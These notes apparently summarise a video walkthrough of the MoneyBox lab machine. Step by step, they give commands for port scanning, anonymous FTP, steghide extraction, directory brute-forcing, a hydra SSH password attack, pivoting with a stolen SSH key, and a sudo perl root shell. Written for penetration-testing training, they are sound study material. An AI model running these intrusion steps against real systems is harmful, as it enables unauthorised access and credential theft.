The following are comprehensive notes and commands from the "MoneyBox Walkthrough" video, structured to reflect a typical OSCP-style methodology for penetration testing.

## MoneyBox Walkthrough (PG-Play) Notes & Commands

This walkthrough focuses on common enumeration, a file-based secret, weak password cracking, lateral movement via SSH key, and a classic `sudo` misconfiguration exploit.

***

### 1. Initial Reconnaissance and Service Enumeration

The first step is setting up the environment and performing a thorough port scan.

#### Environment Setup
It's recommended to export target information as environment variables for ease of use.

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `export IP=[Target IP]` | Sets the target IP. | [[00:18](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=18)] |
| `export URL=http://$IP` | Sets the target URL for web tools. | [[00:18](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=18)] |

#### Nmap Scan
A full-port TCP connect scan to identify all open ports and their service versions.

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `nmap -p- -sT -sV $IP --open` | Scans all 65535 ports (`-p-`), uses a TCP connect scan (`-sT`), probes for service versions (`-sV`), and only shows open ports (`--open`). | [[00:59](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=59)] |
| **Ports Found** | **21 (FTP, vsftpd 3.0.3), 22 (SSH), 80 (HTTP)**. | [[03:29](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=209)] |

***

### 2. Foothold: Exploiting FTP & Steganography

The **FTP (Port 21)** service is a primary target as it's often configured for anonymous access.

#### Anonymous FTP Access
The goal is to log in without credentials to check for files.

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `ftp $IP 21` | Connects to the FTP service. | [[05:24](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=324)] |
| **Login** | Use **`Anonymous`** for both the username and password. | [[05:33](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=333)] |
| **File Retrieval** | Use **`get trytofind.jpg`** to download the file. | [[05:50](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=350)] |

#### Steganography Attack
The retrieved image is likely hiding secret data, which can be extracted using the `steghide` tool.

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `steghide extract -sf trytofind.jpg` | Attempts to extract embedded data from the image. *Requires a passphrase.* | [[07:13](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=433)] |

***

### 3. Foothold: Web Enumeration (Port 80)

The **HTTP (Port 80)** service is enumerated for directories and hidden files.

#### Web Source Code & Directory Fuzzing
Checking the source code reveals no immediate clues [[11:30](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=690)]. The next step is brute-forcing directories.

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 $URL/FUZZ/` | Directory enumeration using `wfuzz`, hiding 404 errors (`--hc 404`). Found the **`/blogs`** directory [[20:20](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=1220)]. | [[14:09](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=849)] |
| **Manual Discovery** | Visiting the `/blogs` page reveals a post with a hint: "another secret directory." | [[21:05](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=1265)] |
| **Secret Found** | Visiting the discovered **`/secrettext`** directory reveals a hidden key/passphrase in the page source: **`s1renisc00l`**. | [[22:26](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=1346)] |

#### Combining Discoveries
The secret key is the passphrase for the image file.

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `steghide extract -sf trytofind.jpg` | Run `steghide` again and enter the passphrase **`s1renisc00l`**. | [[23:43](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=1423)] |
| `cat data.txt` | Read the extracted file, which contains a potential username and a hint: **`hello Renu... your password is too weak`**. | [[24:00](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=1440)] |

***

### 4. Foothold: SSH Brute Force

The user **`renu`** is identified, and their password is confirmed to be weak, suggesting a brute-force attack on **SSH (Port 22)**.

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://$IP` | Brute-forces the SSH service using the user **`renu`** and the popular `rockyou.txt` wordlist. | [[24:45](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=1485)] |
| **Result** | Successfully finds the password for **`renu`** as **`thisisaweakpassword`**. | [[25:35](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=1535)] |
| **Initial Foothold** | `ssh renu@$IP` | [[26:10](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=1570)] |

***

### 5. Local Enumeration and Lateral Movement

After gaining an initial shell as `renu`, the primary goal is to find a path to the `root` user or another user with higher privileges (lateral movement).

#### Initial Checks

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `sudo -l` | Checks if the current user can run any commands as `root` or another user without a password. | [[27:01](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=1621)] |
| **Initial Result** | No easily exploitable `sudo` entries for `renu`. | [[27:18](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=1638)] |

#### Lateral Movement Discovery (to user `lily`)
Further enumeration reveals another user and a configuration file leading to a pivot.

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `cat /etc/passwd` | Lists all local users on the system. Found the user **`lily`**. | [[36:00](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=2160)] |
| `cat ~/.bash_history` | Checks for any commands run by the current user (`renu`) that might reveal secrets or other users. | [[38:08](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=2288)] |
| **Discovery** | The history shows `renu` trying to **`ssh -i .ssh/id_rsa lily@localhost`**, indicating an SSH key for **`lily`** is stored in the current directory. | [[39:07](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=2347)] |
| **Lateral Pivot** | `ssh -i .ssh/id_rsa lily@127.0.0.1` | Log in as **`lily`** using the discovered key. | [[40:20](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=2420)] |

***

### 6. Privilege Escalation to Root

The same initial check, `sudo -l`, is now performed as the new user, `lily`.

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `sudo -l` | Checks `lily`'s `sudo` privileges. | [[41:17](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=2477)] |
| **Discovery** | `lily` can run `/usr/bin/perl` as root **without a password**. | [[41:22](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=2482)] |

#### Root Shell Exploit (GTFOBins)
This is an example of a `sudo` misconfiguration exploit that allows a shell escape by leveraging the `perl` binary's ability to execute system commands.

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `sudo /usr/bin/perl -e 'exec "/bin/bash"'` | Executes a command as root (`sudo`) using the Pearl interpreter (`/usr/bin/perl`), telling it to execute a new Bash shell (`/bin/bash`). | [[44:14](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=2654)] |
| **Final Proof** | `id` (to confirm `uid=0(root)`) and `cat /root/proof.txt`. | [[45:47](http://www.youtube.com/watch?v=jUnHjsUTDoE&t=2747)] |
http://googleusercontent.com/youtube_content/0